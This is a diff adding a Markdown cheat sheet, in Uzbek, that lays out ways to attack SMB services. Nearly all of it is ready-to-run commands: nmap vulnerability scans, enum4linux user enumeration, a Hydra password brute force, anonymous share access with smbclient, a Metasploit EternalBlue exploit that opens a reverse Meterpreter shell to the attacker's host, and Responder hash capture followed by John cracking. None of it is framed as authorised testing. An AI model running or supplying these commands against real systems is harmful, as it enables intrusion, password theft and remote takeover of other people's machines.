@@ -1,0 +1,105 @@
+SMB-ga (Server Message Block) hujum qilish turli usullar orqali amalga oshiriladi. Bu hujumlar odatda zaifliklarni aniqlash, autentifikatsiyani buzish yoki eksploit ishlatish orqali bo‘lishi mumkin. Quyida turli xil hujum usullari va misollar keltirilgan.  
+
+---
+
+## **1. SMB Zaifliklarni Tekshirish (`nmap`)**
+**Nmap yordamida SMB xizmatining zaifligini tekshirish:**  
+```bash
+nmap -p 445 --script smb-vuln* <TARGET-IP>
+```
+**Izoh**:  
+- Bu buyruq **445-portdagi barcha SMB zaifliklarini** tekshiradi.  
+- Agar serverda **EternalBlue** yoki **SMBGhost** kabi zaiflik bo‘lsa, uni aniqlash mumkin.  
+
+Agar faqat **EternalBlue (MS17-010)** zaifligini tekshirmoqchi bo‘lsangiz:  
+```bash
+nmap -p 445 --script smb-vuln-ms17-010 <TARGET-IP>
+```
+
+---
+
+## **2. SMB Username Enum (`enum4linux`)**
+**`enum4linux` yordamida foydalanuvchilar va resurslarni aniqlash:**  
+```bash
+enum4linux -a <TARGET-IP>
+```
+**Izoh**:  
+- **SMB orqali foydalanuvchilarni, papkalarni va ulashilgan resurslarni** ko‘rsatadi.  
+- Agar **anonymous login** ruxsat berilgan bo‘lsa, tizimdagi foydalanuvchilarni chiqaradi.  
+
+Agar faqat foydalanuvchi nomlarini olish kerak bo‘lsa:  
+```bash
+enum4linux -U <TARGET-IP>
+```
+
+---
+
+## **3. SMB Brute Force (Hydra)**
+**Foydalanuvchi va parolni sinab ko‘rish (`hydra`)**  
+```bash
+hydra -L users.txt -P passwords.txt smb://<TARGET-IP>
+```
+**Izoh**:  
+- `users.txt` – ehtimoliy foydalanuvchilar ro‘yxati.  
+- `passwords.txt` – parollar wordlist fayli.  
+- Agar zaif parol bo‘lsa, kirish imkoni paydo bo‘ladi.  
+
+---
+
+## **4. SMB-ga Kirib Fayllarni Ko‘rish (`smbclient`)**
+Agar SMB ochiq bo‘lsa va autentifikatsiyasiz kirish mumkin bo‘lsa:  
+```bash
+smbclient -L //<TARGET-IP> -N
+```
+**Izoh**:  
+- **Ochiq SMB resurslarni ko‘rsatadi.**  
+- `-N` parametri parolsiz login qilishga harakat qiladi.  
+
+Agar muayyan resursga ulanmoqchi bo‘lsangiz:  
+```bash
+smbclient //<TARGET-IP>/sharename -U username
+```
+
+Agar anonymous login ochiq bo‘lsa:  
+```bash
+smbclient //<TARGET-IP>/sharename -N
+```
+
+---
+
+## **5. Exploit Ishlatish (EternalBlue - `Metasploit`)**
+Agar tizimda **MS17-010 (EternalBlue)** zaifligi bo‘lsa, Metasploit orqali hujum qilish mumkin:  
+```bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <TARGET-IP>
+set LHOST <YOUR-IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+```
+**Izoh**:  
+- Bu **Windows tizimiga kirish va Meterpreter shell olish** uchun ishlatiladi.  
+- Faqat MS17-010 zaifligi bo‘lsa ishlaydi.  
+
+---
+
+## **6. SMB Relay Attack (`impacket`)**
+Agar man-in-the-middle hujumini amalga oshirish kerak bo‘lsa:  
+```bash
+sudo responder -I eth0
+```
+**Izoh**:  
+- Bu buyruq **SMB hashlarini ushlab qoladi**, keyin ularni **hash cracking** orqali buzish mumkin.  
+
+Ushlangan NTLM hashni buzish (`john` bilan):  
+```bash
+john --format=NT --wordlist=rockyou.txt hashes.txt
+```
+
+---
+
+## **Xulosa**
+- **Zaifliklarni aniqlash**: `nmap`, `enum4linux`
+- **Brute force hujum**: `hydra`, `crackmapexec`
+- **Exploit ishlatish**: `Metasploit`
+- **Relay Attack**: `Responder`, `Impacket`
